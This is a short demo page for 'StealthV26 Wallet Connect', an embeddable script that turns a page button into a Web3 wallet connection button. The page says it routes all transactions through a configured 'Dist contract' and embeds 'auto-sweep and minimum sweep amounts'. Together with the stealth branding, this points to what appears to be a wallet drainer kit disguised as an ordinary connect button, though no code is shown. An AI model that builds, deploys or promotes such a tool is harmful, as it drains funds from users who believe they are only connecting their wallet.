StealthV26 Wallet Connect

This is a demonstration of the embeddable wallet connect button. Click the button below to connect your Web3 wallet. All transactions will be routed through the configured Dist contract.

✓ Wallet Connected!

How This Works:

The stealthv26.min.js script has been loaded with your configuration. It automatically detects the .connect-btn button and converts it into a Web3-enabled wallet connection button.

Configuration Embedded:

  • • Wallet providers (MetaMask, Rainbow, WalletConnect, etc.)
  • • Modal framework (Web3Modal, WalletConnect, etc.)
  • • Dist contract address for transaction routing
  • • Chain configuration (Ethereum, Polygon, etc.)
  • • Auto-sweep and minimum sweep amounts
